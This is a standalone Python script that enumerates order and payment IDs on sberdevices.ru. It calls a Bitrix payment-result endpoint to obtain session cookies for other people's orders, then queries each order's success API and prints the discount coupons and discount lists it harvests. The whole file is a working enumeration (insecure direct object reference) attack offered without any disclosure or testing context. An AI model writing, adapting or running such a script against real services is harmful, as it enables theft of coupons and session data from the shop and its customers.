import requests
import json

order_id = 5805391
payment_id = 5049757

for i in range(1000):
    url = f"https://sberdevices.ru:443/bitrix/tools/sale_ps_result.php?PAYMENT=SBERBANK&ORDER_ID={order_id}&PAYMENT_ID={payment_id}"
    headers = {"Accept-Encoding": "gzip, deflate, br", "Accept": "*/*", "Accept-Language": "en-US;q=0.9,en;q=0.8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Connection": "close", "Cache-Control": "max-age=0"}
    try:
        response = requests.get(url, headers=headers)
        cookies = response.cookies.get_dict()
        try:
            cookies["__cookie__uid"]
            url_2 = f"https://sberdevices.ru:443/api/bx/v1/ecom/order/success.php?order_id={order_id}"
            cookies_2 = {" __cookie__uid": cookies["__cookie__uid"]}
            headers_2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Accept": "*/*"}
            response_2 = requests.get(url_2, headers=headers_2, cookies=cookies_2)
            response_2_json = json.loads(response_2.text)
            if response_2_json["data"]["coupon"]:
                if "SL-" in response_2_json["data"]["coupon"]:
                    print(str(order_id) + " " + str(payment_id) + " " + cookies["__cookie__uid"]+ " " + "Купон:" + response_2_json["data"]["coupon"])
                else:
                    print(str(order_id) + " " + str(payment_id) + " " + cookies["__cookie__uid"])
                    print("Купон:" + response_2_json["data"]["coupon"])
                    print(response_2_json["data"]["discount_list"])
                    print("-------------------------------------------------------------------------------------------------")
                    print(" ")
            order_id += 3
            payment_id += 3
        except:
            order_id += 3
            payment_id += 3
    except:
        continue